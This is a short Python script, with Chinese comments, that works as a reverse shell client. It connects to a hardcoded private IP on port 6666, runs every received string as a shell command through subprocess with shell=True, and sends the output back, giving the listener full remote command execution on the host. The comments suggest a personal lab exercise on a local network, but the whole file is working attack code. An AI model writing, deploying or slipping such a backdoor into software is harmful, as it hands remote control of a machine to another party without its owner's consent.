import subprocess,socket

def main():
    ip = "10.32.12.127"#本机ip,10.32.12.127为不接网线且连接802.1x时
    port = 6666
    # 建立socket
    shell_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    # connect连接
    shell_socket.connect((ip,port))
    print("Connected Successful")
    # 接收数据
    while True:
        data = shell_socket.recv(1024).decode("gbk")
        # subprocess执行shell命令

        command = subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        STDOUT,STDERR = command.communicate()
        # byte 类型区别于 python2.X
        # 发送输出命令

        shell_socket.send(STDOUT) # 直接发送bytes
        # shell_socket.send(STDERR)
        print (data)
    # 关闭socket
    shell_socket.close()

if __name__ == '__main__':
    main()
